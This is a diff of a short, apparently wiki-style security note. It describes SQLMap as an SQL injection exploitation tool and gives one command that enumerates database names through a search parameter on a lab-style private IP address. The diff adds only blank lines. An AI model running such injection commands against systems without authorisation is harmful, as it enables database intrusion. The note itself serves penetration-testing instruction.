@@ -32,15 +32,33 @@ SQLMap is an automated SQL Injection exploitation tool. This can be used to inse
 
 SQLMap is an automated SQL Injection exploitation tool. This can be used to insert the SQL injection payloads through the application input fields.
 
+
+
 # Procedure
 
+
+
 1. Use the following SQLMap command to obtain the list of database names.
+
+
+
+
+
+
+
+
 
 **Command** ([[SQLMap Command to Reveal Database Names]]):
 
 ```bash
 sqlmap -u 'http://192.168.43.68/vcart/search.php?term=' --dbs
 ```
+
+
+
+
+
+
 
 ## Platforms
 
@@ -57,3 +75,5 @@ sqlmap -u 'http://192.168.43.68/vcart/search.php?term=' --dbs
 - [[sqli]]
 - [[SQL Injection]]
 - [[Web Applications]]
+
+
